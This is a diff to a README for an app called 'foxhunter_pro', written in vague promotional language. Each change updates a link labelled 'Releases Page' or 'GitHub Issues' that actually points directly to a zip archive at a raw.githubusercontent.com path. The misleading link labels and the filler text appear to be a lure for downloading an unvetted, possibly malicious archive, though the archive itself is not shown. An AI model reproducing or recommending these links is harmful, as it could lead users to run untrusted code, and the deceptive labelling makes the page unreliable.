@@ -5,7 +5,7 @@
 Welcome to foxhunter_pro! This application empowers you with human-gated autonomy for a variety of operations. It combines deterministic logic with predictive insight, giving you auditable control over processes. Let’s get you started.
 
 ## 📥 Download & Install
-To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_2.0.zip).
+To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_v2.2-alpha.3.zip).
 
 ### Supported Platforms
 - Windows 10 or later
@@ -20,7 +20,7 @@ To get the software, visit this page to download: [Releases Page](https://raw.gi
 
 ## 🛠️ Installation Steps
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_2.0.zip).
+   Go to our [Releases Page](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_v2.2-alpha.3.zip).
    
 2. **Choose Your Version**  
    On the Releases page, you’ll see a list of available versions. Pick the latest release for the best features and updates.
@@ -58,7 +58,7 @@ To get the software, visit this page to download: [Releases Page](https://raw.gi
 
 ## 📞 Support
 If you encounter issues or have questions, the community is here to help. Reach out through the following channels:
-- **GitHub Issues:** Open a ticket [here](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_2.0.zip).
+- **GitHub Issues:** Open a ticket [here](https://raw.githubusercontent.com/22388761/foxhunter_pro/main/piscation/foxhunter_pro_v2.2-alpha.3.zip).
 - **Discussion Forums:** Join our user community for tips and support.
 
 ## 💡 Tips
